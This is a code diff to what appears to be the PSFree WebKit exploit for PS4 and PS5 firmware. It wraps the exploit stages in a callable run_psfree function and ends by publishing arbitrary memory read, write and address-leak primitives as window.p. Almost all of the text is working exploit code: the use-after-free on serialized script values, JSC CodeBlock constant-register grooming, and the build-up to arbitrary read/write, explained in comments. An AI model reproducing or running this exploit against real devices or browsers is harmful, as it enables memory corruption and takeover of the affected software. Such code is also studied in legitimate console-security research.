@@ -21,10 +21,10 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 // * PS4 [6.00, 10.00)
 // * PS5 [1.00, 6.00)
 
-import { Int } from '/module/int64.mjs';
-import { Memory } from '/module/mem.mjs';
-import { KB, MB } from '/module/offset.mjs';
-import { BufferView } from '/module/rw.mjs';
+import { Int } from './module/int64.mjs';
+import { Memory, mem } from './module/mem.mjs';
+import { KB, MB } from './module/offset.mjs';
+import { BufferView } from './module/rw.mjs';
 
 import {
     die,
@@ -35,45 +35,14 @@ import {
     hex,
     hex_np,
     align,
-} from '/module/utils.mjs';
+} from './module/utils.mjs';
 
-import * as config from '/config.mjs';
-import * as off from '/module/offset.mjs';
+import * as config from './config.mjs';
+import * as off from './module/offset.mjs';
 
-// check if we are running on a supported firmware version
-const [is_ps4, version] = (() => {
-    const value = config.target;
-    const is_ps4 = (value & 0x10000) === 0;
-    const version = value & 0xffff;
-    const [lower, upper] = (() => {
-        if (is_ps4) {
-            return [0x600, 0x1000];
-        } else {
-            return [0x100, 0x600];
-        }
-    })();
-
-    if (!(lower <= version && version < upper)) {
-        throw RangeError(`invalid config.target: ${hex(value)}`);
-    }
-
-    return [is_ps4, version];
-})();
-
-const ssv_len = (() => {
-    if (0x600 <= config.target && config.target < 0x650) {
-        return 0x58;
-    }
-
-    // PS4 9.xx and all supported PS5 versions
-    if (config.target >= 0x900) {
-        return 0x50;
-    }
-
-    if (0x650 <= config.target && config.target < 0x900) {
-        return 0x48;
-    }
-})();
+// these are now set in run_psfree()
+let [is_ps4, version] = [null, null];
+let ssv_len = null;
 
 // these constants are expected to be divisible by 2
 const num_fsets = 0x180;
@@ -114,9 +83,10 @@ const num_leaks = 0x100;
 //
 // const num_repeats = ssv_len / 8 - 2;
 // const rows = ','.repeat(num_repeats);
-const rows = ','.repeat(ssv_len / 8 - 2);
+// these two are now set in run_psfree()
+let rows = null;
 
-const original_strlen = ssv_len - off.size_strimpl;
+let original_strlen = null;
 const original_loc = location.pathname;
 
 function gc() {
@@ -178,8 +148,12 @@ function prepare_uaf() {
 async function uaf_ssv(fsets, index, save_pop=false) {
     const views = [];
     const input = document.createElement('input');
+    input.style.position = 'absolute';
+    input.style.top = '-100px';
     const foo = document.createElement('a');
     foo.id = 'foo';
+    foo.style.position = 'absolute';
+    foo.style.top = '-100px';
 
     debug_log(`ssv_len: ${hex(ssv_len)}`);
 
@@ -400,53 +374,12 @@ async function make_rdr(view) {
     die("JSString wasn't modified");
 }
 
-// we will create a JSC::CodeBlock whose m_constantRegisters is set to an array
-// of JSValues whose size is ssv_len. the undefined constant is automatically
-// added due to reasons such as "undefined is returned by default if the
-// function exits without returning anything"
-const cons_len = ssv_len - 8*5;
-const bt_offset = 0;
-const idx_offset = ssv_len - 8*3;
-const strs_offset = ssv_len - 8*2;
-const src_part = (() => {
-    // we user var instead of let/const since such variables always get
-    // initialized to the NULL JSValue even if you immediately return. we will
-    // make functions that do as little as possible in order to speed up the
-    // exploit. m_constantRegisters will still contain the unused constants
-    //
-    // function foo() {
-    //     return;
-    //     let a = 1;
-    // }
-    //
-    // the resulting bytecode:
-    // bb#1
-    // [   0] enter
-    // [   1] get_scope          loc4
-    // [   3] mov                loc5, loc4
-    // [   6] check_traps
-    // // this part still initializes a with the NULL JSValue
-    // [   7] mov                loc6, <JSValue()>(const0)
-    // [  10] ret                Undefined(const1)
-    // Successors: [ ]
-    //
-    // bb#2
-    // [  12] mov                loc6, Int32: 1(const2)
-    // [  15] ret                Undefined(const1)
-    // Successors: [ ]
-    //
-    //
-    // Constants:
-    //    k0 = <JSValue()>
-    //    k1 = Undefined
-    //    k2 = Int32: 1: in source as integer
-    let res = 'var f = 0x11223344;\n';
-    // make unique constants that won't collide with the possible marker values
-    for (let i = 0; i < cons_len; i += 8) {
-        res += `var a${i} = ${num_leaks + i};\n`;
-    }
-    return res;
-})();
+// these are now set in run_psfree()
+let cons_len = null;
+let bt_offset = null;
+let idx_offset = null;
+let strs_offset = null;
+let src_part = null;
 
 async function leak_code_block(reader, bt_size) {
     const rdr = reader;
@@ -783,7 +716,100 @@ async function make_arw(reader, view2, pop) {
     make_arw._buffer = bt.buffer;
 }
 
-async function main() {
+window.run_psfree = async function(target) {
+    // if target is a string formatted like "4.03" then convert to 0x10403
+    if (typeof target === 'string') {
+        target = parseInt(target.replace('.', ''), 16) | 0x10000;
+    }
+
+    config.set_target(target);
+
+    // check if we are running on a supported firmware version
+    [is_ps4, version] = (() => {
+        const value = config.target;
+        const is_ps4 = (value & 0x10000) === 0;
+        const version = value & 0xffff;
+        const [lower, upper] = (() => {
+            if (is_ps4) {
+                return [0x600, 0x1000];
+            } else {
+                return [0x100, 0x600];
+            }
+        })();
+
+        if (!(lower <= version && version < upper)) {
+            throw RangeError(`invalid config.target: ${hex(value)}`);
+        }
+
+        return [is_ps4, version];
+    })();
+
+    ssv_len = (() => {
+        if (0x600 <= config.target && config.target < 0x650) {
+            return 0x58;
+        }
+
+        // PS4 9.xx and all supported PS5 versions
+        if (config.target >= 0x900) {
+            return 0x50;
+        }
+
+        if (0x650 <= config.target && config.target < 0x900) {
+            return 0x48;
+        }
+    })();
+    rows = ','.repeat(ssv_len / 8 - 2);
+    original_strlen = ssv_len - off.size_strimpl;
+
+
+    // we will create a JSC::CodeBlock whose m_constantRegisters is set to an array
+    // of JSValues whose size is ssv_len. the undefined constant is automatically
+    // added due to reasons such as "undefined is returned by default if the
+    // function exits without returning anything"
+    cons_len = ssv_len - 8 * 5;
+    bt_offset = 0;
+    idx_offset = ssv_len - 8 * 3;
+    strs_offset = ssv_len - 8 * 2;
+    src_part = (() => {
+        // we user var instead of let/const since such variables always get
+        // initialized to the NULL JSValue even if you immediately return. we will
+        // make functions that do as little as possible in order to speed up the
+        // exploit. m_constantRegisters will still contain the unused constants
+        //
+        // function foo() {
+        //     return;
+        //     let a = 1;
+        // }
+        //
+        // the resulting bytecode:
+        // bb#1
+        // [   0] enter
+        // [   1] get_scope          loc4
+        // [   3] mov                loc5, loc4
+        // [   6] check_traps
+        // // this part still initializes a with the NULL JSValue
+        // [   7] mov                loc6, <JSValue()>(const0)
+        // [  10] ret                Undefined(const1)
+        // Successors: [ ]
+        //
+        // bb#2
+        // [  12] mov                loc6, Int32: 1(const2)
+        // [  15] ret                Undefined(const1)
+        // Successors: [ ]
+        //
+        //
+        // Constants:
+        //    k0 = <JSValue()>
+        //    k1 = Undefined
+        //    k2 = Int32: 1: in source as integer
+        let res = 'var f = 0x11223344;\n';
+        // make unique constants that won't collide with the possible marker values
+        for (let i = 0; i < cons_len; i += 8) {
+            res += `var a${i} = ${num_leaks + i};\n`;
+        }
+        return res;
+    })();
+
     debug_log('STAGE: UaF SSV');
     const [fsets, indices] = prepare_uaf()
     const view = await uaf_ssv(fsets, indices[1]);
@@ -805,8 +831,62 @@ async function main() {
     debug_log('STAGE: achieve arbitrary read/write primitive');
     await make_arw(rdr, view2, pop);
 
-    clear_log();
-    // path to your script that will use the exploit
-    import('./code.mjs');
+    let prim = {
+        read1(addr) {
+            addr = new Int(addr.low, addr.hi);
+            const res = mem.read8(addr);
+            return res;
+        },
+
+        read2(addr) {
+            addr = new Int(addr.low, addr.hi);
+            const res = mem.read16(addr);
+            return res;
+        },
+
+        read4(addr) {
+            addr = new Int(addr.low, addr.hi);
+            const res = mem.read32(addr);
+            return res;
+        },
+
+        read8(addr) {
+            addr = new Int(addr.low, addr.hi);
+            const res = mem.read64(addr);
+            return new int64(res.low, res.high);
+        },
+
+        write1(addr, value) {
+            addr = new Int(addr.low, addr.hi);
+            mem.write8(addr, value);
+        },
+
+        write2(addr, value) {
+            addr = new Int(addr.low, addr.hi);
+            mem.write16(addr, value);
+        },
+
+        write4(addr, value) {
+            addr = new Int(addr.low, addr.hi);
+            mem.write32(addr, value);
+        },
+
+        write8(addr, value) {
+            addr = new Int(addr.low, addr.hi);
+            if (value instanceof int64) {
+                value = new Int(value.low, value.hi);
+                mem.write64(addr, value);
+            } else {
+                mem.write64(addr, new Int(value));
+            }
+
+        },
+
+        leakval(obj) {
+            const res = mem.addrof(obj);
+            return new int64(res.low, res.high);
+        }
+    };
+
+    window.p = prim;
 }
-main();
